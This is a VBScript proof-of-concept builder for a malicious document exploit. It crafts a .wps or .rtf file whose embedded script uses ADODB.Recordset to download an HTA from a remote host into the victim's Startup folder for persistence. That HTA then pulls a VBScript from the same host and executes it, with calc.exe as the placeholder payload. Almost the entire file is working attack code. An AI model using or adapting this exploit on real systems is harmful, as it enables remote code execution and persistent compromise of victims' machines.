
Set FS = CreateObject("Scripting.FileSystemObject")

POCFileName=Inputbox("Plase tell me the file name with the desired extension. For example ""Document.wps"" or ""Document.rtf ""","File Name")


If POCFileName = "" Then

WScript.Echo "Error. You need to type the file name plus extension. Aborting script!"

WScript.Quit

End If

exefilename = Inputbox("Plase tell me the file name of the executable, with the .exe extension, to download and run","EXE name")


If exefilename = "" Then

WScript.Echo "Error. You need to type the exe file name plus extension. Aborting script!"

WScript.Quit

End If





strURL = "http://" & IP & "/"

POCFilePath= WScript.ScriptFullName + "/../"




Set ax= FS.CreateTextFile("retrieve-remote-recordset.htm", True)

ax.WriteLine("<html><head></head>")

ax.WriteLine("<body text=white>")

ax.WriteLine("<script language=javascript>")

ax.WriteLine("straddress='" & strURL & "';" )

ax.WriteLine("a = document.location.href;")

ax.WriteLine("b = a.substring(8,300);")

ax.WriteLine("while (b.indexOf('%20') > -1 ) ")

ax.WriteLine("{")

ax.WriteLine("b = b.replace('%20',' ');")

ax.WriteLine("}")

ax.WriteLine("c = b.indexOf(String.fromCharCode(47));")

ax.WriteLine("d = b.indexOf(String.fromCharCode(47), c + 1);")

ax.WriteLine("e = b.indexOf(String.fromCharCode(47), d + 1);")

ax.WriteLine("ca = b.substring(c+1,d); // returns the dir where the user profiles are stored")

ax.WriteLine("f = b.substring(d+1,e);  // returns the username which is the value between the second '/' and then third '/'")

ax.WriteLine("</script>")

ax.WriteLine("<script language=VBScript>")

ax.WriteLine("set rds =CreateObject(""ADODB.Recordset"")")

ax.WriteLine("axx=rds.Open(straddress & ""recordset.txt"")")

ax.WriteLine("svd = ""\users\"" + f + ""\appdata\roaming\microsoft\windows\start menu\programs\startup\poc.hta""")

ax.WriteLine("sve = rds.Save(svd)")

ax.WriteLine("rds.Close")

ax.WriteLine("</script></body></html>")

ax.Close


Set ax = Nothing




Set POCFile = FS.OpenTextFile(POCFileName, 2, True)


If FS.FileExists("poc.bin") Then Set File1 = FS.GetFile("poc.bin")

If Not FS.FileExists("poc.bin") Then 

WScript.Echo "Error. ""poc.bin"" file not found in the current directory. Aborting!"

WScript.Quit

End If

If FS.FileExists("retrieve-remote-recordset.htm") Then Set File2 = FS.GetFile("retrieve-remote-recordset.htm")




If Not FS.FileExists("retrieve-remote-recordset.htm") Then 

WScript.Echo "Error. ""retrieve-remote-recordset.htm"" file not found in the current directory. Aborting!"

WScript.Quit

End If


Set data1 = File1.OpenAsTextStream
Set data2 = File2.OpenAsTextStream

ga = data1.Read(File1.Size)
gb = data2.Read(File2.Size)

POCFile.Write(ga)
POCFile.Write(gb)

POCFile.Close



Set gc = FS.CreateTextFile("dldrun.vbs")


gc.WriteLine("Set e = CreateObject(""Wscript.Shell"")")

gc.WriteLine("e.Run ""calc.exe"",1")


gc.WriteLine("window.close")


gc.Close


Set gd = FS.CreateTextFile("recordsetdata.txt")

gd.WriteLine("random-needed-text")
gd.WriteBlankLines(1)

gd.WriteLine("<html>")
gd.WriteBlankLines(1)

gd.WriteLine("<hta:application showintaskbar=no windowstate=minimized>")
gd.WriteBlankLines(1)

gd.WriteLine("<script language=vbs src=" & strURL & "dldrun.vbs></script></html>")
gd.WriteBlankLines(1)


gd.Close


Set ge = CreateObject("WScript.Shell")
ge.Run "create-recordset.hta",1

